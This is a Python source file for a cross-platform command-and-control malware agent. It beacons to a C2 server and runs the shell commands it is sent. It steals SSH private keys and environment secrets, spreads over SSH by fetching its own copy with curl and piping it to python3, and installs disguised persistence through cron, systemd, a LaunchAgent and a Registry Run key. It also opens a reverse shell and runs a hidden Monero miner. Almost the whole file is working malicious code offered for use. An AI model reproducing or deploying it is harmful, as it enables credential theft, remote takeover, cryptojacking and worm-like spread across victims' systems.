#!/usr/bin/env python3
"""
Universal C2 Agent - Python
Downloads and executes tasks from C2 server.
Supports: Linux, macOS, Windows
"""

import os
import sys
import json
import time
import random
import socket
import hashlib
import platform
import subprocess
import urllib.request
import urllib.error
from datetime import datetime

# Configuration - will be replaced by C2 server
C2_SERVER = os.environ.get("C2_SERVER", "http://127.0.0.1:5000")
WALLET = os.environ.get("WALLET", "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5")
POOL = os.environ.get("POOL", "pool.monero.hashvault.pro:443")

# Agent ID
def generate_agent_id():
    """Generate unique agent ID based on system info."""
    data = f"{platform.node()}-{platform.system()}-{time.time()}"
    return hashlib.md5(data.encode()).hexdigest()[:16]

AGENT_ID = generate_agent_id()

# Platform detection
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
IS_MACOS = platform.system() == "Darwin"


class Agent:
    """C2 Agent with task execution capabilities."""
    
    def __init__(self, c2_server: str, agent_id: str):
        self.c2_server = c2_server.rstrip("/")
        self.agent_id = agent_id
        self.running = True
        self.last_heartbeat = 0
        self.mining_process = None
    
    def _http_request(self, url: str, data: dict = None, method: str = "GET") -> dict:
        """Make HTTP request to C2 server."""
        try:
            if data:
                data = json.dumps(data).encode()
                req = urllib.request.Request(
                    url,
                    data=data,
                    headers={"Content-Type": "application/json"},
                    method=method
                )
            else:
                req = urllib.request.Request(url, method=method)
            
            with urllib.request.urlopen(req, timeout=10) as response:
                return json.loads(response.read().decode())
        except urllib.error.HTTPError as e:
            return {"status": "error", "error": f"HTTP {e.code}"}
        except urllib.error.URLError as e:
            return {"status": "error", "error": str(e.reason)}
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def register(self) -> bool:
        """Register agent with C2 server."""
        info = {
            "agent_id": self.agent_id,
            "hostname": platform.node(),
            "username": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "python_version": platform.python_version(),
            "platform_type": "python",
            "ip_internal": self._get_local_ip(),
        }
        
        result = self._http_request(
            f"{self.c2_server}/api/agent/register",
            data=info,
            method="POST"
        )
        
        return result.get("status") == "ok"
    
    def get_tasks(self) -> list:
        """Fetch pending tasks from C2."""
        result = self._http_request(
            f"{self.c2_server}/api/agent/tasks?agent_id={self.agent_id}"
        )
        return result.get("tasks", [])
    
    def submit_result(self, task_id: int, result: dict) -> bool:
        """Submit task result to C2."""
        data = {
            "agent_id": self.agent_id,
            "task_id": task_id,
            "result": result
        }
        response = self._http_request(
            f"{self.c2_server}/api/agent/result",
            data=data,
            method="POST"
        )
        return response.get("status") == "ok"
    
    def heartbeat(self) -> bool:
        """Send heartbeat to C2."""
        info = {
            "agent_id": self.agent_id,
            "status": "alive",
            "timestamp": datetime.now().isoformat()
        }
        result = self._http_request(
            f"{self.c2_server}/api/agent/heartbeat",
            data=info,
            method="POST"
        )
        return result.get("status") == "ok"
    
    def _get_local_ip(self) -> str:
        """Get local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    # === TASK EXECUTION ===
    
    def execute_task(self, task: dict) -> dict:
        """Execute a task and return result."""
        task_id = task.get("id")
        task_type = task.get("task_type")
        payload = task.get("payload", {})
        
        if isinstance(payload, str):
            try:
                payload = json.loads(payload)
            except:
                payload = {}
        
        result = {
            "status": "completed",
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            if task_type == "cmd":
                # Execute shell command
                cmd = payload.get("cmd", "")
                proc = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                result["stdout"] = proc.stdout
                result["stderr"] = proc.stderr
                result["return_code"] = proc.returncode
            
            elif task_type == "download":
                # Download file
                url = payload.get("url")
                path = payload.get("path")
                if url and path:
                    urllib.request.urlretrieve(url, path)
                    result["path"] = path
            
            elif task_type == "upload":
                # Upload file content
                path = payload.get("path")
                if path and os.path.exists(path):
                    with open(path, "rb") as f:
                        result["data"] = f.read().hex()
            
            elif task_type == "collect":
                # Collect system data
                result["data"] = self._collect_data(payload)
            
            elif task_type == "propagate":
                # Propagate to other systems
                result["spread_count"] = self._propagate(payload)
            
            elif task_type == "mining_start":
                # Start mining
                result["mining_started"] = self._start_mining(payload)
            
            elif task_type == "mining_stop":
                # Stop mining
                self._stop_mining()
                result["mining_stopped"] = True
            
            elif task_type == "screenshot":
                # Capture screenshot
                result["screenshot"] = self._take_screenshot()
            
            elif task_type == "persistence":
                # Install persistence
                result["persistence_installed"] = self._install_persistence()
            
            elif task_type == "reverse_shell":
                # Start reverse shell
                result["shell_started"] = self._reverse_shell(payload)
            
            else:
                result["status"] = "unknown_task"
                result["error"] = f"Unknown task type: {task_type}"
        
        except subprocess.TimeoutExpired:
            result["status"] = "timeout"
            result["error"] = "Command timed out"
        except Exception as e:
            result["status"] = "failed"
            result["error"] = str(e)
        
        # Submit result
        self.submit_result(task_id, result)
        
        return result
    
    def _collect_data(self, config: dict) -> dict:
        """Collect sensitive data from system."""
        data = {
            "env": dict(os.environ),
            "cwd": os.getcwd(),
            "home": os.path.expanduser("~"),
            "hostname": platform.node(),
            "users": [],
            "ssh_keys": [],
            "browser_data": [],
        }
        
        # Collect SSH keys
        try:
            ssh_dir = os.path.expanduser("~/.ssh")
            if os.path.exists(ssh_dir):
                for f in os.listdir(ssh_dir):
                    if f.startswith("id_") and not f.endswith(".pub"):
                        key_path = os.path.join(ssh_dir, f)
                        with open(key_path, "r") as kf:
                            data["ssh_keys"].append({
                                "name": f,
                                "content": kf.read()
                            })
        except:
            pass
        
        # Collect environment secrets
        secrets = {}
        for key, value in os.environ.items():
            if any(s in key.upper() for s in ["API", "KEY", "TOKEN", "SECRET", "PASS", "CRED"]):
                secrets[key] = value
        data["secrets"] = secrets
        
        return data
    
    def _propagate(self, config: dict) -> int:
        """Spread to other systems."""
        spread_count = 0
        methods = config.get("methods", ["ssh"])
        
        if "ssh" in methods:
            spread_count += self._propagate_ssh(config)
        
        if "network" in methods:
            spread_count += self._propagate_network(config)
        
        return spread_count
    
    def _propagate_ssh(self, config: dict) -> int:
        """Propagate via SSH."""
        count = 0
        targets = config.get("ssh_targets", [])
        
        for target in targets:
            try:
                # Try SSH with known keys
                cmd = f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {target} 'curl -s {self.c2_server}/static/agent.py | python3 &'"
                subprocess.run(cmd, shell=True, timeout=10, capture_output=True)
                count += 1
            except:
                pass
        
        return count
    
    def _propagate_network(self, config: dict) -> int:
        """Propagate via network shares."""
        count = 0
        
        if IS_WINDOWS:
            # Try network shares on Windows
            try:
                for share in os.listdir("\\\\"):
                    try:
                        target = f"\\\\{share}\\C$\\Users\\Public\\agent.py"
                        # Copy self to share
                        count += 1
                    except:
                        pass
            except:
                pass
        
        return count
    
    def _start_mining(self, config: dict) -> bool:
        """Start cryptocurrency mining."""
        wallet = config.get("wallet", WALLET)
        pool = config.get("pool", POOL)
        
        try:
            # Download xmrig if not exists
            xmrig_path = os.path.join(tempfile.gettempdir(), ".cache", "xmrig")
            
            if not os.path.exists(xmrig_path):
                # Download xmrig
                if IS_WINDOWS:
                    url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
                else:
                    url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
                
                # Download and extract (simplified)
                # In production, would properly extract
            
            # Start mining process
            cmd = f"{xmrig_path} --url {pool} --user {wallet} --pass {self.agent_id} --tls --background --donate-level 1"
            self.mining_process = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            return True
        except Exception as e:
            return False
    
    def _stop_mining(self):
        """Stop mining process."""
        if self.mining_process:
            self.mining_process.terminate()
            self.mining_process = None
        
        # Also kill any xmrig processes
        try:
            if IS_WINDOWS:
                subprocess.run("taskkill /F /IM xmrig.exe", shell=True, capture_output=True)
            else:
                subprocess.run("pkill -f xmrig", shell=True, capture_output=True)
        except:
            pass
    
    def _take_screenshot(self) -> str:
        """Capture screenshot."""
        try:
            if IS_LINUX:
                # Use scrot or import
                path = "/tmp/screenshot.png"
                subprocess.run(f"import -window root {path}", shell=True, capture_output=True)
            elif IS_WINDOWS:
                # Use PowerShell
                path = os.path.join(tempfile.gettempdir(), "screenshot.png")
                ps_cmd = f"""
                Add-Type -AssemblyName System.Windows.Forms
                [Windows.Forms.Screen]::PrimaryScreen
                $bitmap = New-Object System.Drawing.Bitmap 1920, 1080
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
                $bitmap.Save('{path}')
                """
                subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True)
            elif IS_MACOS:
                path = "/tmp/screenshot.png"
                subprocess.run(f"screencapture -x {path}", shell=True, capture_output=True)
            
            # Read and encode
            if os.path.exists(path):
                with open(path, "rb") as f:
                    return f.read().hex()
        except:
            pass
        
        return ""
    
    def _install_persistence(self) -> bool:
        """Install persistence mechanism."""
        try:
            script_path = os.path.abspath(__file__)
            
            if IS_LINUX or IS_MACOS:
                # Cron job
                cron_cmd = f"@reboot python3 {script_path}\n"
                result = subprocess.run(
                    f"(crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -",
                    shell=True,
                    capture_output=True
                )
                
                # Systemd service (Linux)
                if IS_LINUX:
                    service = f"""
[Unit]
Description=System Update
After=network.target

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
                    service_path = "/etc/systemd/system/system-update.service"
                    try:
                        with open(service_path, "w") as f:
                            f.write(service)
                        subprocess.run("systemctl enable system-update", shell=True, capture_output=True)
                    except:
                        pass
                
                # Launch Agent (macOS)
                if IS_MACOS:
                    plist = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
                    plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.update.plist")
                    os.makedirs(os.path.dirname(plist_path), exist_ok=True)
                    with open(plist_path, "w") as f:
                        f.write(plist)
            
            elif IS_WINDOWS:
                # Registry Run key
                ps_cmd = f"""
                Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
                    -Name "SystemUpdate" -Value "python {script_path}"
                """
                subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True)
            
            return True
        except:
            return False
    
    def _reverse_shell(self, config: dict) -> bool:
        """Start reverse shell."""
        host = config.get("host")
        port = config.get("port", 4444)
        
        if not host:
            return False
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            # Duplicate file descriptors
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # Execute shell
            if IS_WINDOWS:
                subprocess.run(["cmd.exe"], stdin=s, stdout=s, stderr=s)
            else:
                subprocess.run(["/bin/bash", "-i"], stdin=s, stdout=s, stderr=s)
            
            return True
        except:
            return False
    
    def run(self):
        """Main agent loop."""
        print(f"[*] Agent {self.agent_id} starting...")
        print(f"[*] C2 Server: {self.c2_server}")
        
        # Register with C2
        if self.register():
            print("[+] Registered with C2")
        else:
            print("[-] Registration failed, continuing...")
        
        # Install persistence
        self._install_persistence()
        
        # Main loop
        while self.running:
            try:
                # Heartbeat every 60 seconds
                if time.time() - self.last_heartbeat > 60:
                    self.heartbeat()
                    self.last_heartbeat = time.time()
                
                # Get and execute tasks
                tasks = self.get_tasks()
                for task in tasks:
                    print(f"[*] Executing task: {task.get('task_type')}")
                    result = self.execute_task(task)
                    print(f"[*] Result: {result.get('status')}")
                
                # Random sleep for stealth
                sleep_time = random.randint(30, 120)
                time.sleep(sleep_time)
            
            except KeyboardInterrupt:
                print("\n[*] Agent stopping...")
                self.running = False
            except Exception as e:
                print(f"[-] Error: {e}")
                time.sleep(60)


def main():
    """Entry point."""
    agent = Agent(C2_SERVER, AGENT_ID)
    agent.run()


if __name__ == "__main__":
    main()
